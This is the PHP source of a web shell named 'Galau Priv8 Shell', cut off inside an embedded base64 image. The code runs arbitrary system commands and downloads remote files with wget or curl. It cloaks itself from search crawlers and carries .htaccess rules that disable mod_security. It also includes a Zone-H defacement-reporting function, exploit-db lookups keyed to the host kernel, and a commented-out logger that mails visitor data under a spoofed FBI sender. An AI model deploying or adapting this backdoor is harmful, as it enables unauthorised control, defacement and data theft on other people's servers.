<?php
/**********************************************************************************************
*                             Kamu tahu hal yang romantis dari hujan?                         *                                       
*                               Ia selalu ingin kembali meski tahu                            *                                     
*                                  rasanya jatuh berkali kali                                 *                           
*                                                                                             *
*                        Disini dingin, tapi mustahil bagiku untuk kembali                    *                                               
*                          Karena ku sudah jauh melangkah dan tersesat                        *                                        
*                              Sekarang turun hujan, yang membawaku                           *                                   
*                           kembali dimasa kau tak curiga bahwa ada yang                      *                                           
*                              menyukaimu, bahkan ia bersama denganmu                         *                                      
*                                    selama satu semester lalu                                *                         
*   ./MyHeartIsyr                                                                             *             
***********************************************************************************************

------------------------------------------------------+
Galau Priv8 Shell by ./MyHeartIsyr                    |
Untuk mengenang MZ a.k.a Medina Zafarayana yang entah |
kemana :P~                                            |
------------------------------------------------------+

------------------------------------------------------+
                                                      |
Thanks to:                                            |
                                                      |
FalahGo5 (sampai jumpa di jurusan yang sama)          |
Magnum (Saatnya kita beraksi tuan)                    |
AnonGhost Team                                        |
Garuda Security Hacker                                |
Null-Byte                                            /
Yogyafree X-Code                                     \
Github, Pastebin, and DuckDuckGo (thanks for your    /
services)                                            \
All Indonesian Hackers Team                           \
MZ (tanpa kau, mungkin aku akan menjalani tahun ajaran/
2017/2018 dengan membosankan)                         \
                                                      |
------------------------------------------------------+

------------------------------------------------------+
WARNING!!!                                            |
Tak ada laki-laki, perempuan, tua, muda, bahkan       |
banci yang dilibatkan/disakiti dalam pembuatan        |
shell ini                                             |                                               
------------------------------------------------------+
*/

@set_time_limit(0);
@error_reporting(0);
@error_log(0);
if(version_compare(PHP_VERSION, '5.3.0', '<')){
	@set_magic_quotes_runtime(0);
}
@define("VERSION", "1.0");

$my_config = array(
	"title" => "Galau Priv8 Shell", // your title your rulez
	"version" => VERSION,
	"footer" => "Copyright &copy; ./MyHeartIsyr"
);

if(get_magic_quotes_gpc()){
	function alakazam_ss($array){
		return @is_array($array) ? array_map('alakazam_ss', $array) : stripslashes($array);
	}
	$_POST = alakazam_ss($_POST);
}

// How to f*ck off the robots?? Follow this rules below

if(!empty($_SERVER['HTTP_USER_AGENT'])){
	$uaArray = array("GoogleBot", "PycURL", "MSNBot", "ia_archiver", "bingbot", "Yahoo! Slurp", "facebookexternalhit", "crawler", "Rambler", "Yandex");
	if(preg_match("/".implode("|", $uaArray)."/i", $_SERVER['HTTP_USER_AGENT'])){
		@header("HTTP/1.1 404 Not Found");
		exit;
	}
}

// End of f*ck the robots

$charset = "utf-8";
$sm = (ini_get(strtolower('safe_mode')) == 'on') ? "<font color='red'>ON</font>" : "<font color='lime'>OFF</font>";
$edblink="http://www.exploit-db.com/search/?action=search&filter_description=";
$google = "https://www.google.com/search?q=";
$google .= urlencode(php_uname());
if(strpos("Linux", php_uname('s'))){
	$edblink .= urlencode('Linux Kernel' . substr(php_uname('r'), 0,6));
}
else {
	$edblink .= urlencode(php_uname('s') . ' ' . substr(php_uname('r'), 0, 3));
}
if(!empty(ini_get('disable_function'))){
	$dis = ini_get('disable_function');
}
else {
	$dis = "<font color=\"#00ff00\">None</font>";
}
$duplicate_name = "wakanda";
$hta = "<IfModule mod_security.c> 
SecFilterEngine Off 
SecFilterScanPOST Off 
SecFilterCheckURLEncoding Off 
SecFilterCheckUnicodeEncoding Off 
</IfModule>

AddType application/x-httpd-php txt
AddHandler txt php
AddHandler txt html";

// Wants to monitor this shell?? Uncomment this code below

/*
$ip = $_SERVER['REMOTE_ADDR'];
if(preg_match("/Windows/", $_SERVER['HTTP_USER_AGENT'])){
	$os = "Windows";
}
elseif(preg_match("/Linux/", $_SERVER['HTTP_USER_AGENT'])){
	$os = "Linux";
}
elseif(preg_match("/Macintosh/", $_SERVER['HTTP_USER_AGENT'])){
	$os = "Macintosh";
}
else {
	$os = "Another Os";
}
if(preg_match("/Firefox/", $_SERVER['HTTP_USER_AGENT'])){
	$browser = "Mozilla Firefox";
}
elseif(preg_match("/Chrome/", $_SERVER['HTTP_USER_AGENT'])){
	$browser = "Google Chrome";
}
elseif(preg_match("/Safari/", $_SERVER['HTTP_USER_AGENT'])){
	$browser = "Safari";
}
elseif(preg_match("/Trident/", $_SERVER['HTTP_USER_AGENT'])){
	$browser = "Internet Explorer";
}
elseif(preg_match("/Opera/", $_SERVER['HTTP_USER_AGENT'])){
	$browser = "Opera Browser";
}
else {
	$browser = "Another Browser";
}

 
	
$mail_to = "me@example.com"; //change to your email
$mail_from = "staff@fbi.gov";
$mail_subject = "Logs Report";
$mail_msg = "Ip: " . $ip . "\r\n";
$mail_msg .= "Browser: " . $browser . "\r\n";
$mail_msg .= "Operating System: " . $os . "\r\n";
$mail_msg .= "Last Access" . date("F j Y, g:i A") . "\r\n"
 
 
$header = "Content type: text/html; charset=iso-8859-1" . "\r\n";
$header .= "MIME-Version: 1.0" . "\r\n";
$header .= "From: Federal Bureau of Investigation <$mail_from>" . "\r\n";
$header .= "To: $mail_to" . "\r\n";

@mail($mail_to, $mail_subject, $mail_msg, $header);
*/

// End of Monitoring

// Function goes here

function lets_call($cmd) {
	if(function_exists('system')) { 		
		@ob_start(); 		
		@system($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} 
	elseif(function_exists('exec')) { 		
		@exec($cmd,$results); 		
		$buff = ""; 		
		foreach($results as $result) { 			
			$buff .= $result; 		
		} return $buff; 	
	} 
	elseif(function_exists('passthru')) { 		
		@ob_start(); 		
		@passthru($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} 
	elseif(function_exists('shell_exec')) { 		
		$buff = @shell_exec($cmd); 		
		return $buff; 	
	} 
}

function magicboom($text) {
    if (!get_magic_quotes_gpc()) {
        return $text;
    }
    return stripslashes($text);
}

function ambil_aja($pink, $namanya){
	if($buka = @fopen($pink, "r")){
		while(@feof($buka)){
			$lihat = @fread($buka, 1024);
		}
		@fclose($buka);
		$bukalagi = @fopen($namanya, "w");
		@fwrite($bukalagi, $lihat);
		@fclose($bukalagi);
	}
}

function which($par){
	$path = lets_call("which $par");
	if(!empty($par)){
		return trim($path);
	}
	else {
		return trim($par);
	}
}

function getthesource($cmd, $url){
	switch($cmd){
		case 'wwget':
			lets_call(which('wget')." ".$url." -O ".$namafile);
			break;
		case 'wlynx':
			lets_call(which('lynx')." -source ".$url." > ".$namafile);
			break;
		case 'wfread':
			ambil_aja($wurl, $filename);
			break;
		case 'wfetch':
			lets_call(which('fetch')." -o ".$namafile." -p ".$url);
			break;
		case 'wlinks':
			lets_call(which('links')." -source ".$url." > ".$namafile);
			break;
		case 'wget':
			lets_call(which('GET')." ".$url." > ".$namafile);
			break;
		case 'wcurl':
			lets_call(which('curl')." ".$url." -o ".$namafile);
			break;
		default: break;
	}
}

function ex_func($var){
	if(function_exists($var)){
		return "<font color='#00ff00'>ON</font>";
	}
	else {
		return "<font color='#ff0000'>OFF</font>";
	}
}

function octal2ascii_perms($file){
	$perms = fileperms($file);
	if (($perms & 0xC000) == 0xC000) {
	// Socket
	$info = 's';
	} elseif (($perms & 0xA000) == 0xA000) {
	// Symbolic Link
	$info = 'l';
	} elseif (($perms & 0x8000) == 0x8000) {
	// Regular
	$info = '-';
	} elseif (($perms & 0x6000) == 0x6000) {
	// Block special
	$info = 'b';
	} elseif (($perms & 0x4000) == 0x4000) {
	// Directory
	$info = 'd';
	} elseif (($perms & 0x2000) == 0x2000) {
	// Character special
	$info = 'c';
	} elseif (($perms & 0x1000) == 0x1000) {
	// FIFO pipe
	$info = 'p';
	} else {
	// Unknown
	$info = 'u';
	}
		// Owner
	$info .= (($perms & 0x0100) ? 'r' : '-');
	$info .= (($perms & 0x0080) ? 'w' : '-');
	$info .= (($perms & 0x0040) ?
	(($perms & 0x0800) ? 's' : 'x' ) :
	(($perms & 0x0800) ? 'S' : '-'));
	// Group
	$info .= (($perms & 0x0020) ? 'r' : '-');
	$info .= (($perms & 0x0010) ? 'w' : '-');
	$info .= (($perms & 0x0008) ?
	(($perms & 0x0400) ? 's' : 'x' ) :
	(($perms & 0x0400) ? 'S' : '-'));
	// World
	$info .= (($perms & 0x0004) ? 'r' : '-');
	$info .= (($perms & 0x0002) ? 'w' : '-');
	$info .= (($perms & 0x0001) ?
	(($perms & 0x0200) ? 't' : 'x' ) :
	(($perms & 0x0200) ? 'T' : '-'));
	return $info;
}

function ZoneH($url, $hacker, $hackmode, $reson, $site){
	$k = curl_init();
	curl_setopt($k, CURLOPT_URL, $url);
	curl_setopt($k, CURLOPT_POST,true);
	curl_setopt($k, CURLOPT_POSTFIELDS,"defacer=".$hacker."&domain1=". $site."&hackmode=".$hackmode."&reason=".$reson);
	curl_setopt($k, CURLOPT_FOLLOWLOCATION, true);
	curl_setopt($k, CURLOPT_RETURNTRANSFER, true);
	$kubra = curl_exec($k);
	curl_close($k);
	return $kubra;
}

// Function ends here

$my_header = "data:image/png;base64,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